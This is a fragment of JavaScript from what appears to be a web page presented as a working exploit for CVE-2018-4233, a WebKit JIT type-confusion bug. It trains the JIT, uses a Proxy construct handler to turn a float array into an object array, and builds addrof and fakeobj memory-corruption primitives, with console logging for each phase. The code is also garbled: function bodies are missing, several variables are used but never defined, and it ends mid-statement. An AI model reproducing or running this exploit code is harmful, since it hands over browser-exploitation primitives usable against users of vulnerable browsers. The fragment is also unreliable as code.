        let logDiv = document.getElementById('log');
        
        function log(msg, type = 'success') {

        function clearLog() {

        // ================================================================
        // INT64 UTILITY
        // ================================================================
        class Int64 {
            constructor(low, high) {
                this.low = (low >>> 0);
                this.high = (high >>> 0);
            }

            static fromDouble(d) {
                let bytes = new Uint8Array(new Float64Array([d]).buffer);
                return new Int64(
                    (bytes[0] | (bytes[1] << 8) | (bytes[2] << 16) | (bytes[3] << 24)) >>> 0,
                    (bytes[4] | (bytes[5] << 8) | (bytes[6] << 16) | (bytes[7] << 24)) >>> 0
                );
            }

            toDouble() {
                let bytes = new Uint8Array(8);
                bytes[0] = this.low & 0xff;
                bytes[1] = (this.low >>> 8) & 0xff;
                bytes[2] = (this.low >>> 16) & 0xff;
                bytes[3] = (this.low >>> 24) & 0xff;
                bytes[4] = this.high & 0xff;
                bytes[5] = (this.high >>> 8) & 0xff;
                bytes[6] = (this.high >>> 16) & 0xff;
                bytes[7] = (this.high >>> 24) & 0xff;
                return new Float64Array(bytes.buffer)[0];
            }

            toString() {
                return '0x' + ('00000000' + this.high.toString(16)).substr(-8) +
                              ('00000000' + this.low.toString(16)).substr(-8);
            }

            equals(other) {
                return this.low === other.low && this.high === other.high;
            }

            isPointer() {
                return this.high === 0 && this.low !== 0;
            }
        }

        // ================================================================
        // THE REAL CVE-2018-4233 EXPLOIT
        // ================================================================
        function runRealExploit() {
            clearLog();
            log('═══════════════════════════════════════════════════════', 'critical');

            log('═══════════════════════════════════════════════════════', 'critical');
            log('', 'info');

            try {
                log('[PHASE 1] Building the confused array', 'warning');
                log('', 'info');

                // The key: we need ONE array that JIT thinks is floats
                // but we convert to objects during CreateThis
                
                let confusionArray = null;
                let confusionTriggered = false;

                // Constructor function
                function ConfusedConstructor() {
                    // Access a property that will trigger getter
                    this.a = confusionArray[0];
                }

                // Create Proxy handler
                let handler = {
                    construct: function(target, args) {
                        if (!confusionTriggered) {
                            confusionTriggered = true;
                            log('  [!] Proxy construct() executing!', 'critical');
                            
                            // CRITICAL: Change array from float to object DURING CreateThis
                            // JIT thinks it's still float array
                            confusionArray[0] = {};
                            confusionArray[1] = {};
                            confusionArray[2] = {};
                            confusionArray[3] = {};
                            
                            log('  [!] Array converted: float → object', 'critical');
                        }
                        return new target(...args);
                    }
                };

                // Initialize as float array
                confusionArray = [1.1, 2.2, 3.3, 4.4];
                log('  [*] Created float array: [1.1, 2.2, 3.3, 4.4]', 'info');

                // Train JIT to expect float array
                log('  [*] Training JIT (this takes a moment)...', 'info');
                
                for (let i = 0; i < 100000; i++) {
                    new ConfusedConstructor();
                }
                
                log('  [+] JIT trained - optimized for float array', 'success');
                log('', 'info');

                // Create Proxied constructor
                let ProxiedConstructor = new Proxy(ConfusedConstructor, handler);

                // Trigger the bug!
                log('  [*] Triggering type confusion...', 'warning');
                new ProxiedConstructor();

                if (!confusionTriggered) {
                    log('  [!!!] Confusion did NOT trigger!', 'error');
                    return;
                }

                log('  [+] Type confusion successful!', 'success');
                log('', 'info');

                log('[PHASE 2] Building addrof/fakeobj primitives', 'warning');
                log('', 'info');

                // Now confusionArray is confused!
                // JIT thinks it's float[], but it's actually object[]

                function addrof(obj) {
                    // Write object to confused array
                    confusionArray[0] = obj;
                    
                    // Read it back as float
                    // If JIT still thinks it's float array, we get the pointer!
                    let floatVal = confusionArray[0];
                    
                    // Check if it's actually a float or an object
                    if (typeof floatVal === 'object') {
                        log('    [!] WARNING: Got object, not float! Confusion wore off.', 'error');
                        return new Int64(0, 0);
                    }
                    
                    return Int64.fromDouble(floatVal);
                }

                function fakeobj(addr) {
                    // Write address as float
                    confusionArray[0] = addr.toDouble();
                    
                    // Read it back as object
                    return confusionArray[0];
                }

                log('  [+] addrof() primitive built', 'success');
                log('  [+] fakeobj() primitive built', 'success');
                log('', 'info');

                log('[PHASE 3] Testing primitives', 'warning');
                log('', 'info');

                // Test addrof

                let testObj = {pwn: 0x1337};

                log('    Input:  {pwn: 0x1337}', 'info');
                log('    Output: ' + addr.toString(), addr.isPointer() ? 'success' : 'error');
                log('    Is real pointer: ' + addr.isPointer(), addr.isPointer() ? 'success' : 'error');
                log('', 'info');

                // Test fakeobj

                log('    Output: ' + fakeObject, 'info');
                log('    Type:   ' + typeof fakeObject, 'info');

                // Test round-trip

                log('', 'info');

                log('═══════════════════════════════════════════════════════', 'critical');
                
                if (addr.isPointer() && rtAddr.equals(rtRecovered)) {
